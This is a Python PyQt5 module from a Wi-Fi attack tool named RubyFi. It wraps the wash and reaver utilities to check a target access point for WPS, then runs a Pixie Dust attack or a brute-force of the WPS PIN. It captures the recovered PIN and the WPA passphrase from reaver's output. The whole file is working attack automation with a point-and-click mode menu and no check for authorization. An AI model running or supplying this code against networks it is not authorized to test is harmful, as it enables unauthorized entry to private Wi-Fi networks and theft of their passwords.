#!/usr/bin/env python3
"""
gui/wps_dialog.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RubyFi  —  WPS Attack background thread + mode dialog.

Drop this file in  gui/  then add to main_window.py imports:
    from gui.wps_dialog import WPSAttackThread, WPSModeDialog
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import re
import time
import subprocess

from PyQt5.QtCore    import QThread, pyqtSignal, Qt
from PyQt5.QtWidgets import QDialog, QVBoxLayout, QPushButton, QLabel


# ═══════════════════════════════════════════════════════════════════
#  BACKGROUND THREAD
# ═══════════════════════════════════════════════════════════════════

class WPSAttackThread(QThread):
    """
    Runs WPS check → Pixie Dust / PIN brute-force in the background.

    Signals
    -------
    statusupdate(str)               — log line
    phasechanged(str, str)          — (label_text, hex_colour)
    statsupdate(int, str, str)      — (elapsed_s, progress_pct, pins_tried)
    wps_result(str, str)            — ("pin"|"psk", value)  on success
    attackcomplete(bool, str)       — (success, message/credential)
    """

    statusupdate   = pyqtSignal(str)
    phasechanged   = pyqtSignal(str, str)
    statsupdate    = pyqtSignal(int, str, str)   # elapsed, progress%, pins_tried
    wps_result     = pyqtSignal(str, str)         # type, value
    attackcomplete = pyqtSignal(bool, str)

    def __init__(self, interface, bssid, ssid, channel, mode="pixiedust"):
        super().__init__()
        self.interface = interface
        self.bssid     = bssid
        self.ssid      = ssid
        self.channel   = str(channel)
        self.mode      = mode        # "pixiedust" | "pinbrute" | "both"
        self.running   = True
        self._process  = None
        self.start_time = None

    # ── helpers ─────────────────────────────────────────────────────

    def _s(self, msg):
        self.statusupdate.emit(msg)

    def _phase(self, text, colour="#00b4d8"):
        self.phasechanged.emit(text, colour)

    def _kill_reaver(self):
        subprocess.run(["pkill", "-9", "reaver"], capture_output=True)
        if self._process and self._process.poll() is None:
            try:
                self._process.terminate()
                self._process.wait(timeout=3)
            except Exception:
                pass
        self._process = None

    # ── WPS check via wash ───────────────────────────────────────────

    def _check_wps(self):
        """
        Returns dict: {enabled: bool, locked: bool}
        Mirrors CLI check_wps_enabled logic exactly.
        """
        self._phase("🔍  CHECKING WPS STATUS", "#00b4d8")
        self._s(f"Running wash scan on {self.interface} (20s) ...")

        # lock channel first
        subprocess.run(
            ["iwconfig", self.interface, "channel", self.channel],
            capture_output=True,
        )
        time.sleep(1)

        result = {"enabled": False, "locked": False}
        try:
            r = subprocess.run(
                ["timeout", "20", "wash", "-i", self.interface],
                capture_output=True, text=True,
            )
            for line in r.stdout.splitlines():
                bssid_norm = self.bssid.upper().replace(":", "").replace("-", "")
                line_norm  = line.upper().replace(":", "").replace("-", "")
                if bssid_norm in line_norm:
                    result["enabled"] = True
                    parts = line.split()
                    if len(parts) >= 5:
                        for i, p in enumerate(parts):
                            if p.upper() == "YES" and i >= 4:
                                result["locked"] = True
                    break
        except Exception as e:
            self._s(f"! wash scan error: {e}")

        if result["enabled"]:
            if result["locked"]:
                self._s("⚠  WPS is ENABLED but LOCKED / Rate-Limited")
            else:
                self._s("✅  WPS is ENABLED and UNLOCKED — great chance of success!")
        else:
            self._s("✖  WPS is NOT enabled on this AP")
        return result

    # ── Pixie Dust ───────────────────────────────────────────────────

    def _run_pixiedust(self):
        self._phase("⚡  PIXIE DUST ATTACK", "#00b4d8")
        self._s("Launching Pixie Dust — exploits weak WPS RNG ...")
        self._s("If vulnerable, password revealed in seconds!")

        cmd = [
            "reaver", "-i", self.interface,
            "-b", self.bssid,
            "-c", self.channel,
            "-K", "1", "-N", "-vv",
        ]
        self._s(f"CMD: {' '.join(cmd)}")

        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
            )
            self.start_time = time.time()

            while self.running and self._process.poll() is None:
                try:
                    line = self._process.stdout.readline()
                    if not line:
                        break
                    line = line.strip()
                    if not line:
                        continue

                    elapsed = int(time.time() - self.start_time)
                    self._emit_reaver_line(line, elapsed)

                    # ── detect success ────────────────────────
                    pin_match = re.search(r"WPS PIN[:\s]+([\d]{4,8})", line, re.IGNORECASE)
                    psk_match = re.search(r"WPA PSK[:\s]+(.+)", line, re.IGNORECASE)


                    if pin_match:
                        pin = pin_match.group(1).strip()
                        self._s(f"🔑  WPS PIN FOUND: {pin}")
                        self.wps_result.emit("pin", pin)

                    if psk_match:
                        psk = psk_match.group(1).strip()
                        self._s(f"🔓  WPA PSK FOUND: {psk}")
                        self.wps_result.emit("psk", psk)
                        self.attackcomplete.emit(True, psk)
                        return True

                    # ── detect failure ────────────────────────
                    if any(x in line for x in [
                        "Failed to recover", "AP rate limiting",
                        "WPS transaction failed",
                    ]):
                        self._s(f"✖  {line}")

                except Exception:
                    pass

            return False

        except Exception as e:
            self._s(f"! Pixie Dust error: {e}")
            return False

    # ── PIN Brute-Force ──────────────────────────────────────────────

    def _run_pinbrute(self):
        self._phase("🔢  PIN BRUTE-FORCE", "#ffbe0b")
        self._s("Launching PIN brute-force (11,000 combinations) ...")
        self._s("⚠  This can take hours — watch the progress bar!")

        cmd = [
            "reaver", "-i", self.interface,
            "-b", self.bssid,
            "-c", self.channel,
            "-d", "1", "-T", "0.5",
            "-vv", "-L", "-N",
            "-r", "5:3",
        ]
        self._s(f"CMD: {' '.join(cmd)}")

        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
            )
            if not self.start_time:
                self.start_time = time.time()

            while self.running and self._process.poll() is None:
                try:
                    line = self._process.stdout.readline()
                    if not line:
                        break
                    line = line.strip()
                    if not line:
                        continue

                    elapsed = int(time.time() - self.start_time)
                    self._emit_reaver_line(line, elapsed)

                    # ── success ───────────────────────────────
                    pin_match = re.search(r"WPS PIN[:\s]+([\d]{4,8})", line, re.IGNORECASE)
                    psk_match = re.search(r"WPA PSK[:\s]+(.+)", line, re.IGNORECASE)

                    if pin_match:
                        self.wps_result.emit("pin", pin_match.group(1).strip())

                    if psk_match:
                        psk = psk_match.group(1).strip()
                        self._s(f"🔓  WPA PSK FOUND: {psk}")
                        self.wps_result.emit("psk", psk)
                        self.attackcomplete.emit(True, psk)
                        return True

                except Exception:
                    pass

            return False

        except Exception as e:
            self._s(f"! PIN brute-force error: {e}")
            return False

    # ── parse + emit one reaver output line ─────────────────────────

    def _emit_reaver_line(self, line, elapsed):
        """
        Parse progress from reaver output and emit statsupdate signal.
        Also forward interesting lines to statusupdate.
        """
        # filter noise
        if not any(kw in line for kw in [
            "%", "PIN", "PSK", "Trying", "Waiting", "Failed",
            "WPS", "rate", "warn", "Sending", "ACK",
        ]):
            return

        progress = "—"
        pins     = "—"

        pct_match = re.search(r"(\d{1,3}\.\d{2})%", line)
        if pct_match:
            progress = f"{pct_match.group(1)}%"

        pin_try = re.search(r"Trying pin[:\s]+(\d+)", line, re.I)
        if pin_try:
            pins = pin_try.group(1)

        self.statsupdate.emit(elapsed, progress, pins)
        self._s(line)

    # ── MAIN THREAD ENTRY ────────────────────────────────────────────

    def run(self):
        try:
            # ── PHASE 0: channel lock ────────────────────────────
            self._phase("⚙  SETTING UP", "#00b4d8")
            subprocess.run(
                ["iwconfig", self.interface, "channel", self.channel],
                capture_output=True,
            )
            time.sleep(0.5)

            # ── PHASE 1: WPS check ───────────────────────────────
            wps_info = self._check_wps()

            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            if not wps_info["enabled"]:
                self._phase("✖  WPS NOT ENABLED", "#ff006e")
                self._s("WPS is NOT enabled on this AP — attack aborted.")
                self.attackcomplete.emit(False, "WPS not enabled on target AP")
                return

            if wps_info["locked"]:
                self._phase("⚠  WPS LOCKED", "#ffbe0b")
                self._s("WPS is locked/rate-limited — Pixie Dust may still work")

            # ── PHASE 2: attack ──────────────────────────────────
            if self.mode == "pixiedust":
                success = self._run_pixiedust()

            elif self.mode == "pinbrute":
                success = self._run_pinbrute()

            elif self.mode == "both":
                self._s("Trying Pixie Dust first ...")
                success = self._run_pixiedust()
                if not success and self.running:
                    self._s("Pixie Dust done — switching to PIN brute-force ...")
                    success = self._run_pinbrute()

            else:
                success = False

            if not success and self.running:
                elapsed = int(time.time() - (self.start_time or time.time()))
                self._phase("❌  NO RESULT", "#8b949e")
                self.attackcomplete.emit(
                    False,
                    f"Attack finished — no credentials recovered ({elapsed}s)"
                )

        except Exception as e:
            self.attackcomplete.emit(False, str(e))
        finally:
            self._kill_reaver()

    def stop(self):
        self.running = False
        self._kill_reaver()


# ═══════════════════════════════════════════════════════════════════
#  MODE SELECTION DIALOG
# ═══════════════════════════════════════════════════════════════════

class WPSModeDialog(QDialog):
    """
    Lets the user pick Pixie Dust / PIN Brute-Force / Both.

    Attributes
    ----------
    selected_mode : str | None   "pixiedust" | "pinbrute" | "both"
    """

    def __init__(self, target_ssid, target_bssid, target_channel,
                 interface, parent=None):
        super().__init__(parent)
        self.setWindowTitle("WPS Attack")
        self.setModal(True)
        self.setMinimumSize(540, 420)
        self.target_ssid    = target_ssid
        self.target_bssid   = target_bssid
        self.target_channel = target_channel
        self.interface      = interface
        self.selected_mode  = None
        self._init_ui()

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(4)

        # ── header ──────────────────────────────────────────────
        header = QLabel("📡  WPS PIN ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet(
            "font-size:18px; font-weight:bold; color:#00b4d8; margin:14px;"
        )
        layout.addWidget(header)

        # ── target strip ─────────────────────────────────────────
        info = QLabel(
            f"  Target  {self.target_ssid}    ·    "
            f"{self.target_bssid}    ·    Ch {self.target_channel}"
        )
        info.setStyleSheet(
            "color:#c9d1d9; margin:6px; padding:10px;"
            "background:#161b22; border-radius:6px; font-size:12px;"
        )
        layout.addWidget(info)

        # ── warning strip ────────────────────────────────────────
        warn = QLabel("⚠  WPS status will be verified automatically before attack")
        warn.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warn.setStyleSheet("color:#ffbe0b; font-size:11px; margin:4px;")
        layout.addWidget(warn)

        # ── mode buttons ─────────────────────────────────────────
        MODES = [
            (
                "⚡  Pixie Dust Attack  (Fast — seconds)",
                "pixiedust", "#00b4d8",
                "Exploits weak WPS random number generation — works instantly if AP is vulnerable",
            ),
            (
                "🔢  PIN Brute-Force  (Slow — hours)",
                "pinbrute", "#ffbe0b",
                "Tries all 11,000 WPS PIN combinations — guaranteed if WPS is unlocked",
            ),
            (
                "🔄  Both — Pixie Dust first, then PIN",
                "both", "#00ff88",
                "Best of both: tries fast Pixie Dust, falls back to PIN brute-force automatically",
            ),
        ]

        for text, mode_id, colour, desc in MODES:
            btn = QPushButton(text)
            btn.setMinimumHeight(54)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #21262d;
                    border: 2px solid {colour};
                    color: {colour};
                    font-size: 13px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 22px;
                    border-radius: 6px;
                }}
                QPushButton:hover {{
                    background: {colour};
                    color: #0d1117;
                }}
            """)
            btn.clicked.connect(lambda _, m=mode_id: self._select(m))
            layout.addWidget(btn)

            desc_lbl = QLabel(desc)
            desc_lbl.setStyleSheet(
                "color:#8b949e; font-size:10px;"
                "margin-left:28px; margin-bottom:8px;"
            )
            layout.addWidget(desc_lbl)

        layout.addStretch()

        # ── cancel ───────────────────────────────────────────────
        cancel = QPushButton("Cancel")
        cancel.setStyleSheet("""
            QPushButton {
                background: #161b22; border: 2px solid #8b949e;
                color: #8b949e; padding: 10px; border-radius: 6px;
            }
            QPushButton:hover { background: #8b949e; color: #0d1117; }
        """)
        cancel.clicked.connect(self.reject)
        layout.addWidget(cancel)

    def _select(self, mode_id):
        self.selected_mode = mode_id
        self.accept()
